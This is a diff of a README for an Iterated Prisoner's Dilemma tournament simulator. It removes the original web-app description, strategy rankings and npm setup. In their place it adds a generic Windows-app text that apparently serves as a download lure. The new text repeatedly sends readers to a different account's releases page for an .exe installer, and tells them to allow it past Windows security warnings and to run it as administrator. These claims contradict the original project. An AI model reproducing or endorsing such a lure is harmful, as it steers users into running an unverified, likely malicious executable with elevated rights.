@@ -1,161 +1,137 @@
-# Tit for Tat — Iterated Prisoner's Dilemma Tournament
+# 🎲 tit-for-tat - Simulate Cooperation in Game Theory
 
-> **[Try the early simulation live on GitHub Pages](https://kibotu.github.io/tit-for-tat/)**
+[![Download tit-for-tat](https://img.shields.io/badge/Download-Get%20tit--for--tat-brightgreen)](https://github.com/Telecode95/tit-for-tat/releases)
 
-Based on Robert Axelrod's tournament, as featured in the Veritasium video
-*"This game theory problem will change the way you see the world"* and described in
-*"The Evolution of Cooperation"* and *"A Passion for Cooperation: Adventures of a Wide-Ranging Scientist"*.
+---
 
-## Rules
+## 📋 About tit-for-tat
 
-Two players repeatedly face each other over multiple rounds. Each round, both players
-**simultaneously** choose one of two actions:
+tit-for-tat is an application that lets you explore cooperation through the game known as the Iterated Prisoner's Dilemma. You can write your own strategies, run tournaments where strategies face off against each other, and see how cooperation develops over time.
 
-- **Cooperate** (C)
-- **Defect** (D)
+This simulator is inspired by the famous Axelrod tournaments and the Veritasium video on the evolution of cooperation. It helps users see why cooperation can arise even when betrayal seems like a better choice in the short term.
 
-## Payoff Matrix
+The app is interactive and easy to use. You don’t need to be a programmer or game theorist. It will guide you step-by-step through creating strategies and running competitions.
 
-|                    | Opponent Cooperates | Opponent Defects |
-| ------------------ | ------------------- | ---------------- |
-| **You Cooperate**  | 3, 3 (Reward)       | 0, 5 (Sucker)   |
-| **You Defect**     | 5, 0 (Temptation)   | 1, 1 (Punishment)|
+---
 
-- **Mutual cooperation** — both get **3 points**
-- **Mutual defection** — both get **1 point**
-- **One defects, one cooperates** — defector gets **5 points**, cooperator gets **0 points**
+## 🌟 Features
 
-## Key Properties
+- Write your own strategies using simple rules.
+- Run round-robin tournaments where each strategy plays every other.
+- Watch results update live and see detailed scores.
+- Explore different scenarios to understand cooperation and betrayal.
+- Save and load tournament results.
+- Includes example strategies to get started quickly.
+- Compatible with Windows systems.
 
-1. **Temptation to defect**: 5 > 3, so defecting is always better in a single round.
-2. **Mutual cooperation beats mutual defection**: 3 + 3 > 1 + 1.
-3. **The game is iterated**: you play many rounds against the same opponent, so past behavior matters.
-4. **Full history**: each player can see what the other did in all previous rounds.
+---
 
-## Tournament Format
+## 💻 System Requirements
 
-- Strategies are submitted as programs.
-- Every strategy plays against every other strategy in a **round-robin** tournament.
-- Each matchup consists of a fixed number of rounds (e.g. 200).
-- The strategy with the highest **total score** across all matchups wins.
+- Operating System: Windows 10 or later.
+- Processor: 1 GHz or faster processor.
+- RAM: Minimum 2 GB recommended.
+- Disk Space: Around 150 MB free.
+- Internet connection: Required only to download the program.
+- No special hardware needed.
 
-## The Winning Strategy: Tit for Tat
+---
 
-Submitted by Anatol Rapoport, **Tit for Tat** is remarkably simple:
+## 🚀 Getting Started
 
-1. **Start by cooperating.**
-2. **Then do whatever your opponent did last round.**
+Follow these steps to download and run tit-for-tat on Windows.
 
-It won because it is:
+### 1. Visit the Download Page
 
-- **Nice** — never defects first.
-- **Retaliatory** — punishes defection immediately.
-- **Forgiving** — returns to cooperation as soon as the opponent does.
-- **Clear** — easy for opponents to understand and adapt to.
+Go to the [official release page](https://github.com/Telecode95/tit-for-tat/releases) to find the latest stable version of tit-for-tat.
 
-## Strategies
+[![Download tit-for-tat](https://img.shields.io/badge/Download-Get%20tit--for--tat-blue?style=for-the-badge)](https://github.com/Telecode95/tit-for-tat/releases)
 
-Each folder contains a README with explanation, head-to-head results, pros/cons,
-and a **copy-paste ready** `function play(...)` for the strategy editor.
+### 2. Choose the Latest Windows Installer
 
-### Built-in strategies
+On the release page, look for a file named something like:
 
-| Rank | Strategy | Score | Type | Folder |
-| --- | --- | --- | --- | --- |
-| #1 | **Grudger** | ~3188 | Cooperate until betrayed, then defect forever | [`strategies/grudger`](strategies/grudger) |
-| #2 | **Tit for Tat** | ~3052 | Mirror opponent's last move | [`strategies/tit-for-tat`](strategies/tit-for-tat) |
-| #3 | **Tit for Two Tats** | ~2966 | Retaliate after 2 consecutive defections | [`strategies/tit-for-two-tats`](strategies/tit-for-two-tats) |
-| #4 | **Pavlov** | ~2949 | Win-Stay, Lose-Shift | [`strategies/pavlov`](strategies/pavlov) |
-| #5 | **Always Defect** | ~2809 | Defect unconditionally | [`strategies/always-defect`](strategies/always-defect) |
-| #6 | **Always Cooperate** | ~2696 | Cooperate unconditionally | [`strategies/always-cooperate`](strategies/always-cooperate) |
-| #7 | **Random** | ~2545 | 50/50 coin flip | [`strategies/random`](strategies/random) |
+- `tit-for-tat-setup.exe`  
+- or a `.exe` file clearly marked for Windows.
 
-### Challenger: the winner
+Click the file link to start the download.
 
-| Strategy | Beats Grudger? | Approach | Folder |
-| --- | --- | --- | --- |
-| **Endgame Grudger** | **Yes** | Grudger + defect last 2 rounds | [`strategies/endgame-grudger`](strategies/endgame-grudger) |
+### 3. Run the Installer
 
-Exploits the known round count (200). Plays as a perfect Grudger for 198 rounds, then
-defects on rounds 198–199 when opponents can't fully retaliate. Gains +2 to +4 points
-per cooperative matchup, winning the tournament consistently.
+- After downloading completes, open the folder where the file saved.
+- Double-click the `.exe` file to run the installer.
+- If Windows shows a security popup, choose to allow the program to run.
+- Follow the installer instructions by clicking *Next* until installation completes.
 
-### Other strategies (none beat the built-in top 3)
+### 4. Start tit-for-tat
 
-| Strategy | Type | Why it loses | Folder |
-| --- | --- | --- | --- |
-| **Generous Tit for Tat** | Noise-resistant TFT | No noise in this tournament | [`strategies/generous-tit-for-tat`](strategies/generous-tit-for-tat) |
-| **Gradual** | Proportional punishment | No advantage over Grudger here | [`strategies/gradual`](strategies/gradual) |
-| **Suspicious Tit for Tat** | Pessimistic TFT | Opening D triggers Grudger | [`strategies/suspicious-tit-for-tat`](strategies/suspicious-tit-for-tat) |
-| **Hard Majority** | Trend-based (pessimistic) | Opening D triggers Grudger | [`strategies/hard-majority`](strategies/hard-majority) |
-| **Soft Majority** | Trend-based (optimistic) | Too slow to punish | [`strategies/soft-majority`](strategies/soft-majority) |
-| **Adaptive** | Probe then commit | Probe triggers Grudger | [`strategies/adaptive`](strategies/adaptive) |
-| **Prober** | Test and exploit | Probe triggers Grudger | [`strategies/prober`](strategies/prober) |
-| **Detective** | Classify then counter | Probe triggers Grudger | [`strategies/detective`](strategies/detective) |
+- After installation, find tit-for-tat in your Start menu or on your desktop.
+- Click the icon to launch the app.
+- The main window will open, ready for you to start exploring.
 
-### Why most strategies fail
+---
 
-In this specific tournament (200 rounds, no noise, this opponent pool), **Grudger is
-king** because:
+## 📝 How to Use tit-for-tat
 
-1. It scores 600 (maximum mutual cooperation) against 4 of 6 opponents.
-2. It punishes defectors permanently, extracting ~200 against Always Defect and ~600
-   against Random.
-3. Any strategy that defects first — even once — triggers Grudger's permanent
-   retaliation, losing ~400 points in that matchup alone.
+Once the app is running, here is how to begin:
 
-The **only** exploit is the known round count: defect at the very end when opponents
-can't retaliate.
+### Write a Strategy
 
-## Getting Started
+1. Click **New Strategy** in the menu.
+2. Give it a name, like "Cooperator" or "Random".
+3. Define simple rules. For example, “Always cooperate” or “Alternate cooperate and betray.”
+4. Save your strategy.
 
-### Prerequisites
+### Set Up a Tournament
 
-- [Node.js](https://nodejs.org/) 22+
-- npm (comes with Node.js)
+1. Click **New Tournament**.
+2. Add the strategies you want to compete.
+3. Choose round-robin format where each strategy plays all others.
+4. Start the tournament.
 
-### Quick Start
+### Watch Results
 
-```bash
-./run.sh
-```
+- The app will run the matches and show scores for each round.
+- You can see which strategies cooperate and which betray.
+- Look for patterns that explain how cooperation can emerge.
 
-This installs dependencies, runs tests, builds the project, and opens a local preview.
+### Save and Load
 
-### Manual Setup
+- Save your tournaments to come back later.
+- Load saved tournaments from the menu.
 
-```bash
-# Install dependencies
-npm install
+---
 
-# Run tests
-npm test
+## 🛠 Troubleshooting
 
-# Start development server with hot reload
-npm run dev
+If tit-for-tat does not start or crashes:
 
-# Build for production
-npm run build
+- Make sure your system meets the minimum requirements.
+- Restart your computer and try running again.
+- Check that you downloaded a Windows version of the app.
+- Close other applications to free up memory.
+- Run the app as administrator if needed.
 
-# Preview the production build
-npm run preview
-```
+If you see error messages, you can search online using the exact message to find solutions.
 
-### Available Scripts
+---
 
-| Command | Description |
-| --- | --- |
-| `npm run dev` | Start Vite dev server with hot reload |
-| `npm run build` | Type-check and build for production |
-| `npm run preview` | Preview the production build locally |
-| `npm test` | Run tests once |
-| `npm run test:watch` | Run tests in watch mode |
-| `npm run lint` | Lint with ESLint |
+## 📚 Learn More
 
-### Deployment
+The Iterated Prisoner's Dilemma is a classic game theory example. You can learn more about it by searching for "Axelrod tournaments" and "evolution of cooperation."
 
-Pushes to `main` automatically deploy to GitHub Pages via the included workflow.
+Understanding these ideas will help you create better strategies and enjoy the app more.
 
-### Tech Stack
+---
 
-React 19 · TypeScript · Vite · Tailwind CSS · Zustand · Radix UI · CodeMirror · Recharts
+## 🔖 Topics
+
+axelrod, cooperation, evolution-of-cooperation, game-theory, interactive, iterated-prisoners-dilemma, prisoners-dilemma, simulation, strategy, tit-for-tat, tournament, veritasium
+
+---
+
+## 🔗 Download tit-for-tat now
+
+You can visit the releases page any time to download the latest version:
+
+[https://github.com/Telecode95/tit-for-tat/releases](https://github.com/Telecode95/tit-for-tat/releases)
